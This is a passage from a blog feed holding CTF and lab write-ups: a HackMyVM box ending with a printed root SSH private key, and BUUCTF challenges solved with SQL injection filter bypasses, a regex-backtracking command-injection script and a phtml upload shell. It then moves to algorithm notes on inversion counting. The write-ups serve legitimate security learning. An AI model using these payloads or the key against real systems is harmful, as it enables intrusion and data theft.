class="line">rirB3Y5jjhhzwgIK7GNQ7oUe9GsErmZjD4c4KueznC5r+tQXu3AAAAwQDWGTkRzOeKRxE/</span><br><span class="line">C6vFoWfAj3PbqlUmS6clPOYg3Mi3PTf3HyooQiSC2T7pK82NBDUQjicTSsZcvVK38vKm06</span><br><span class="line">K6fle+0TgQyUjQWJjJCdHwhqph//UKYoycotdP+nBin4x988i1W3lPXzP3vNdFEn5nXd10</span><br><span class="line">5qIRkVl1JvJEvrjOd+0N2yYpQOE3Qura055oA59h7u+PnptyCh5Y8g7O+yfLdw3TzZlR5T</span><br><span class="line">DJC9mqI25np/PtAKNBEuDGDGmOnzdU47sAAADBAMeBRAhIS+rM/ZuxZL54t/YL3UwEuQis</span><br><span class="line">sJP2G3w1YK7270zGWmm1LlbavbIX4k0u/V1VIjZnWWimncpl+Lhj8qeqwdoAsCv1IHjfVF</span><br><span class="line">dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL</span><br><span class="line">3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0</span><br><span class="line">DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  将内容保存在rsa文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 rsa # 一般都需要设置成600  </span><br><span class="line">ssh root@ip -i rsa</span><br></pre></td></tr></table></figure><h4 id="0x30-总结"><a href="#0x30-总结" class="headerlink" title="0x30 总结"></a>0x30 总结</h4><p>  lookup这台机器算是hmv中难度中等的一个机器，主要还是通过突破验证到达指定文件系统。文件系统是易受攻击的系统。拿到服务器权限之后，这一点我确实认为pwm这个文件太像ctf了，分析之后利用id伪造拿到密码横向到think用户，最后是通过sudo 提权拿到root私钥成功获取权限。下机</p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF刷题buuctf</title>
      <link href="/2024/10/02/CTF%E5%88%B7%E9%A2%98buuctf/"/>
      <url>/2024/10/02/CTF%E5%88%B7%E9%A2%98buuctf/</url>
      
        <content type="html"><![CDATA[<h4 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h4><p>拿到相关题目，其实根据功能和参数分析。需要传入一个学号然后进行针对于对应的学号进行一个查询，很可能就会存在sql注入。</p><p>其实这道题最难的点，在于过滤了空格，因此我们使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/</span><br></pre></td></tr></table></figure><p>来过滤空格的限制。<br><strong>相关payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?stunum=1/**/and/**/1=1--+</span><br><span class="line">?stunum=1/**/and/**/1=2--+</span><br></pre></td></tr></table></figure><p>我们采用and方式可以根据页面的返回结果判断成功或者失败，典型的一个布尔盲注。<br>我习惯采用bp 进行盲注。</p><h4 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h4><p>rce的点，进入之后先针对于提示将get参数传递为json格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一次见识到通过get传递json格式的参数。我们可以得到回显index.php</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0a&quot;cmd&quot;:&quot;ls /home/rceservice&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>题目有源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>is_string()<br> is_string() 主要用于确保输入是字符串类型，json格式也被当做字符串。</li><li>preg_match()<br> 黑名单，这次过滤的确实很多</li><li>json_decode()<br> 相当于将json格式，解码成一个数组。</li><li>putenv() 设置环境变量<br> <code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> 这行代码确实会限制可执行命令的搜索路径<br> 意味着我们的命令执行会收到限制。因为系统一些命令一般都在&#x2F;usr&#x2F;bin下，目前我们搜索不到了。</li></ol><p>在大多数类 Unix 系统中，<code>cat</code> 命令的常见路径是 <code>/bin/cat</code> 或者 <code>/usr/bin/cat</code>。具体使用哪个路径，通常取决于系统的配置和不同 Linux 发行版的标准。<br>也就意味着&#x2F;bin&#x2F;cat 更具有兼容性，因此在被限制环境变量时候我们想要使用一些可执行文件，我们就必须要用&#x2F;bin&#x2F;cat</p><ul><li><strong>&#x2F;bin&#x2F;cat</strong>：这个路径通常包含基本的系统命令，供所有用户使用，且在系统启动时可用。</li><li><strong>&#x2F;usr&#x2F;bin&#x2F;cat</strong>：这个路径通常用于存放用户级的应用程序和命令</li></ul><blockquote><p>通过对于代码的一些分析，可以看到这道题并不是很难，我们唯一的突破点在于preg_match()函数的绕过。而preg_match()函数绕过有三种方式。但是数组因为有一个is_string校验无法使用。</p></blockquote><h5 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h5><p>查看flag的位置过程不做赘述，直接是ls 查看home就可以。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://5dd96313-13f8-4eb6-89eb-0dbb5a4ba30a.node3.buuoj.cn&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;cmd&#x27;:&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27;+&#x27;b&#x27;*1000000+&#x27;&quot;&#125;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">由于我们是把json解码成为数组,因此可以看到我们需要保留cmd方便读取，我们另外在加一个123来增加长度。</span></span><br><span class="line">r=requests.post(url=url,data=data).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><h5 id="0a"><a href="#0a" class="headerlink" title="%0a"></a>%0a</h5><p>这个其实比较简单,具体不做赘述。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><h4 id="ACTF2-极客大挑战-2019-BabySQL"><a href="#ACTF2-极客大挑战-2019-BabySQL" class="headerlink" title="[ACTF2## [极客大挑战 2019]BabySQL"></a>[ACTF2## [极客大挑战 2019]BabySQL</h4><h3 id="1020-新生赛-Upload"><a href="#1020-新生赛-Upload" class="headerlink" title="1020 新生赛]Upload"></a>1020 新生赛]Upload</h3><p>测试很多，有前端校验还有后端校验。黑名单<br>首先出传递1.jpg，之后再bp中改包。然后更改后缀为phtml<br>访问对应的文件，拿到shell<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241002224812.png" alt="image.png"></p><h4 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h4><p> 经过测试用户名和密码处两处都存在注入点。并且通过报错可以看到某些关键字被过滤。其实也就是一些关键字被过滤。我们全部使用双写绕过就可以。所以存在报错注入，布尔盲注，强制报错注入。<br> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> http://b1cafe94-d5ee-4133-96ff-e61ebb12b891.node5.buuoj.cn:81/check.php?username=admin&amp;password=a&#x27;ororderder bbyy 5--+</span><br><span class="line"></span><br><span class="line">http://b1cafe94-d5ee-4133-96ff-e61ebb12b891.node5.buuoj.cn:81/check.php?username=admin&#x27;ANANDD Extractvalue(1,concat(&#x27;~&#x27;,()))--+&amp;password=a</span><br></pre></td></tr></table></figure></p><p>利用报错注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拿到表</span></span><br><span class="line">http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&amp;password=a%27uniunionon%20selselectect%201,2,group_concat(table_name)%20FRFROMOM%20infoORrmation_schema.tables%20WHWHEREERE%20table_schema%20=%20%27geek%27--+</span><br><span class="line"></span><br><span class="line">b4bsql,geekuse</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拿到列</span></span><br><span class="line">http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&amp;password=a%27uniunionon%20selselectect%201,2,group_concat(column_name) FRfromOM infoorrmation_schema.columns WHEwhereRE table_name = &#x27;b4bsql&#x27; --+</span><br><span class="line"></span><br><span class="line">id username password</span><br><span class="line"></span><br><span class="line">http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&amp;password=a%27uniunionon%20selselectect%201,2,group_concat(id,username,passwoorrd) FRfromOM b4bsql --+</span><br><span class="line"></span><br><span class="line">直接拿到flag</span><br><span class="line">1cl4yi_want_to_play_2077,2sqlsql_injection_is_so_fun,3porndo_you_know_pornhub,4gitgithub_is_different_from_pornhub,5Stopyou_found_flag_so_stop,6badguyi_told_you_to_stop,7hackerhack_by_cl4y,8flagflag&#123;900b1ab5-4178-41c5-83ba-b3773993ede1&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法-Init</title>
      <link href="/2024/09/20/%E7%AE%97%E6%B3%95-Init/"/>
      <url>/2024/09/20/%E7%AE%97%E6%B3%95-Init/</url>
      
        <content type="html"><![CDATA[<p>（1）有限性（Finiteness）：算法必<br>需在有限步骤内结束；<br>（2）确定性（Definiteness）：算法的每一个步骤必须清晰无歧义地定义；<br>（3）输入（Input）：有若干个输入<br>（4）输出（Output）：至少1个以上的输出；<br>5）有效性（Effectiveness）：每个步骤必须可行而且在有限时间内完成 。</p><h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><p>（1）伪代码（自然语言+自定义符号）<br>（2）程序流程图<br>（3）程序：算法的某种计算机语言的表达</p><p>***第一个</p><p>算法 E. 给定两个正整数m、n，求出它们的最大公因数。</p><pre><code>E1. [求余数] 将m除以n得余数r(0≤r&lt;n)。E2. [余数是否为0？] If r=0,n就是最大公约数，结束。E3. [缩小范围] m←n，n←r，回到E1</code></pre><h3 id="流程图"><a href="#流程图" class="headerlink" title="*流程图:"></a>*流程图:</h3><p>略</p><h4 id="时间复杂度和空间复杂度"><a href="#时间复杂度和空间复杂度" class="headerlink" title="时间复杂度和空间复杂度"></a>时间复杂度和空间复杂度</h4><p>（1）时间复杂性：利用某算法处理一个问题尺度为N的输入所需的时间，称为该算法的时间复杂性，记为函数T(N)。<br> （2）T(N)的上界：如果存在正常数C和N0，使得当N&gt;&#x3D;N0时有T(N)&lt;&#x3D;Cf(N)成立，则函数f(N)是T(N)增长率的个上界，记为T(N)&#x3D;O(f(N))</p><p>（3）T(N)的下界：如果存在正常数C和使得对无穷多个N有T(N)&gt;&#x3D;Cf(N)成立，则函数f(N)是T(N)增长率的个下界，记为T(N)&#x3D;Ω(f(N))<br> （4）T(N)的同阶：如果T(N)&#x3D;O(f(N))且T(N)&#x3D;Ω(f(N))，那么T(N)和f(N)的增长率是同阶的，记为T(N)&#x3D;θ(f(N))<br> （5）空间复杂度：类似时间复杂度，只把时间换成内存空间大小即可</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法-分治和逆序</title>
      <link href="/2024/09/20/%E7%AE%97%E6%B3%95-%E5%88%86%E6%B2%BB%E5%92%8C%E9%80%86%E5%BA%8F/"/>
      <url>/2024/09/20/%E7%AE%97%E6%B3%95-%E5%88%86%E6%B2%BB%E5%92%8C%E9%80%86%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>分治法（Divide and Conquer）是一种重要的算法设计范式，它通过将复杂的问题分解成更小、更易于管理和解决的子问题，然后递归地解决这些子问题，最后将子问题的解合并以得到原问题的解。分治法通常用于排序、搜索、数学计算和优化等问题。</p><p>分治法的核心思想可以概括为三个步骤：</p><ol><li><p><strong>分解（Divide）</strong>：将原问题分解为若干个规模较小的相同问题。</p></li><li><p><strong>解决（Conquer）</strong>：递归地解决这些子问题。如果子问题足够小，可以直接解决。</p></li><li><p><strong>合并（Combine）</strong>：将子问题的解合并以得到原问题的解。</p></li></ol><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><ol><li><p><strong>最佳情况</strong>：如果每次分区操作都能将数组均匀地分成两个相等的部分，那么快速排序的时间复杂度是最优的。在这种情况下，递归的深度是 logn（其中 n 是数组的长度），每一层的工作时间是 O(n)。因此，总的时间复杂度是 �(�log⁡�)O(nlogn)。</p></li><li><p><strong>平均情况</strong>：在大多数情况下，快速排序的性能接近最佳情况，尽管可能不是完全均匀的划分。平均情况下的时间复杂度也是 O(nlogn)。</p></li><li><p><strong>最坏情况</strong>：如果每次分区操作都极不均匀，例如每次只将数组分成一个元素和其余元素两部分，那么递归的深度将是 �n，每一层的工作时间仍然是 �(�)O(n)，但总共有 �n 层。因此，总的时间复杂度是 O(n的平方)。这种情况通常发生在数组已经有序或者完全逆序的情况下。</p></li></ol><h4 id="逆序"><a href="#逆序" class="headerlink" title="逆序"></a>逆序</h4><p>  2 4 1 3 5</p><p>初始化逆序数 count&#x3D;0;</p><p>（2，4）正序</p><p>（2，1）逆序，count&#x3D;1;</p><p>（2，3）正序</p><p>（2，5）正序</p><p>（4，1）逆序，count&#x3D;2;</p><p>（4，3）逆序，count&#x3D;3;</p><p>（1，3）正序</p><p>（1，5）正序</p><p>（3，5）正序</p><p>一般来讲一个一个对照的话，一般就是也就是说这种算法的时间复杂度上限为O(n2)。</p><p>但是分治策略，可以降低到nlogn  因此可以直接操作。</p><h4 id="对应算法"><a href="#对应算法" class="headerlink" title="对应算法"></a>对应算法</h4><p>两个有序的序列 去合并成新序列，并且找到逆序数。</p><p>假定分解后的两个序列分别为A,B，（A在前，B在后）已得到A,B的逆序数分别为rA,rB且假定计数完逆序数后把A,B排序为有序序列，以此为基础，得到A,B两序列元素之间的逆序数的合并算法为MAC算法（有（ai,bj）组合，ai来自A，bj来自B，如果有逆序就要计数）。</p><p>算法 MAC. 给定两个有序序列A、B，输出它们之间的逆序数和一个合并后有序        的序列C。</p><p>    MAC1. [初始化变量] 初始化A、B、C的下标i&#x3D;0，j&#x3D;0，k&#x3D;0，和计数值               count&#x3D;0，初始化C为空序列；</p><p>MAC2. [A或B是否没有元素？]if A没有元素 or B没有元素，把有元素                不空的那个序列剩余的元素全部加到C的后面并返回count和C；</p><p>    MAC3. [是否要增加逆序数？] If A[i]&gt;B[j],count增加的计数值为A中还              有的元素数量，把B[j]从B中移到C的最后面，j←j+1,k←k+1；</p><p>    MAC4. [无需增加逆序数] 把A[i]从A中移到C的最后面，                         i←i+1,k←k+1，回到MAC2。停止的条件就是有一方数组为空 停止全部操作加入到第三个序列</p><h6 id="给个例子"><a href="#给个例子" class="headerlink" title="给个例子"></a>给个例子</h6><p>例2.2 用MAC算法数一下序列A&#x3D; {2,4 ,7}，B&#x3D;{1,3,5,8}之间的逆序数。</p><p>初始化逆序数 i&#x3D;0,j&#x3D;0,k&#x3D;0,count&#x3D;0,C&#x3D;{};</p><p>A[i]&gt;B[j],count&#x3D;3,A&#x3D;{2,4,7},B&#x3D;{3,5,8},C&#x3D;{1},j&#x3D;1,k&#x3D;1;<br>A[i]&lt;B[j],count&#x3D;3,A&#x3D;{4,7},B&#x3D;{3,5,8},C&#x3D;{1,2},i&#x3D;1,k&#x3D;2;<br>A[i]&gt;B[j],count&#x3D;5,A&#x3D;{4,7},B&#x3D;{5,8}C&#x3D;{1,2,3},j&#x3D;2,k&#x3D;3;<br>A[i]&lt;B[j],count&#x3D;5,A&#x3D;{7},B&#x3D;{5,8}C&#x3D;{1,2,3,4},i&#x3D;2,k&#x3D;4;<br>A[i]&gt;B[j],count&#x3D;6,A&#x3D;{7},B&#x3D;{8}C&#x3D;{1,2,3,4,5},j&#x3D;3,k&#x3D;5;<br>A[i]&lt;B[j],count&#x3D;6,A&#x3D;{},B&#x3D;{8}C&#x3D;{1,2,3,4,5,7},i&#x3D;3,k&#x3D;6;<br>C&#x3D;{1,2,3,4,5,7,8},k&#x3D;7,返回count,C;</p><p>最后计数值count&#x3D;6,C&#x3D;{1,2,3,4,5,7,8}。</p><p>但我越来越感觉其实这个需要分治策略时候刚好是分成了两个有序数列。因为只有这样才是所谓mac算法的前提。这样不仅能够求出逆序数，同样的可以使得序列按照顺序排列。</p><h3 id="SAC算法"><a href="#SAC算法" class="headerlink" title="SAC算法"></a>SAC算法</h3><p><em>递归算法和分治策略</em></p><p>将一个序列排序并且找到全部逆向序列数</p><p>算法 SAC. 给定序列S，输出该序列的的逆序数count和排序后的S</p><p>    SAC1. [是否分解到基问题？] if S的元素只有1个，count&#x3D;0,返回count              和S；</p><p>SAC2. [分解S]把S分解为两个序列A，B，A是前半，B是后半；</p><p>    SAC3. [递归] 分别对A、B递归执行SAC算法，即（rA,A）&#x3D;SAC(A);</p><p>                  （rB,B）&#x3D;SAC(B)；</p><p>    SAC4. [合并] 把对A，B执行MAC合并算法，即（r,S）&#x3D;MAC(A，B);  SAC5. [加总] count←r+rA+rB，返回count，S。</p><h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.com.test;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SAC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入待计数逆序的整数序列(以空格分开,各项值都不同)&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line">        String[] tokens = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">int</span>[] S1 = <span class="keyword">new</span> <span class="title class_">int</span>[tokens.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tokens.length; i++) &#123;</span><br><span class="line">            S1[i] = Integer.parseInt(tokens[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> sortAndCount(S1);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; S1.length; i++) &#123;</span><br><span class="line">            System.out.print(S1[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;\n逆序计数为： &quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sortAndCount</span><span class="params">(<span class="type">int</span>[] S)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (S.length == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> S.length / <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span>[] A = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span>[] B = <span class="keyword">new</span> <span class="title class_">int</span>[S.length - n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; A.length; i++)</span><br><span class="line">            A[i] = S[j++];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; B.length; i++)</span><br><span class="line">            B[i] = S[j++];</span><br><span class="line">        <span class="type">int</span> <span class="variable">rA</span> <span class="operator">=</span> sortAndCount(A);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rB</span> <span class="operator">=</span> sortAndCount(B);</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> mergeAndCount(A, B, S);</span><br><span class="line">        <span class="keyword">return</span> (r + rA + rB);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">mergeAndCount</span><span class="params">(<span class="type">int</span>[] A, <span class="type">int</span>[] B, <span class="type">int</span>[] C)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> e: A)</span><br><span class="line">            System.out.print(e);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> e: B)</span><br><span class="line">            System.out.print(e);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; A.length &amp;&amp; j &lt; B.length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] &gt; B[j]) &#123;</span><br><span class="line">                count += A.length - i;</span><br><span class="line">                C[k++] = B[j++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                C[k++] = A[i++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == A.length &amp;&amp; j &lt; B.length)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> j; l &lt; B.length; l++)</span><br><span class="line">                C[k++] = B[l];</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.length &amp;&amp; j == B.length)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i; l &lt; A.length; l++)</span><br><span class="line">                C[k++] = A[l];</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 